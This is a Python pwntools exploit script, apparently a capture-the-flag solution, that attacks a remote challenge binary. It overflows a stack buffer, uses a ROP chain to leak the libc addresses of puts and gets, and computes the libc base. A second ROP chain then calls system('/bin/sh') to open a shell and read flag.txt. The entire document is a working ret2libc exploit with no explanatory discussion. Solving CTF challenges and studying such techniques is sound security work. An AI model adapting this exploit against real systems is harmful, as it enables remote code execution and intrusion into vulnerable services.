from pwn import *
elf = context.binary = ELF("./chal", checksec=False)

# p = process('./chal')
p = remote("IP_ADDR", 5006)

offset = 0x28
pop_rdi = p64(0x40118d)
plt_puts = p64(elf.plt['puts'])
got_puts = p64(elf.got['puts'])
got_gets = p64(elf.got['gets'])

# Part 1 - Leaking the Address

payload = b'A'*offset
payload += pop_rdi + got_puts + plt_puts
payload += pop_rdi + got_gets + plt_puts
payload += p64(elf.sym['main'])

p.sendlineafter(b'whats your favourite shell?', payload)
p.recvline()
p.recvline()

leaked_puts = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
leaked_gets = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
print("Leaked PUTS:", hex(leaked_puts))
print("Leaked GETS:", hex(leaked_gets))

# Part 2 - Exploitation

libc = ELF('./libc6_2.35-0ubuntu1_amd64.so')
libc.address = leaked_puts - libc.sym['puts']

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*offset + rop.chain()
p.sendlineafter(b'whats your favourite shell?', payload)
p.recvline()
p.recvline()

p.sendline(b'cat flag.txt')
flag = p.recvall(timeout=1).strip()
print(flag.decode())
p.close()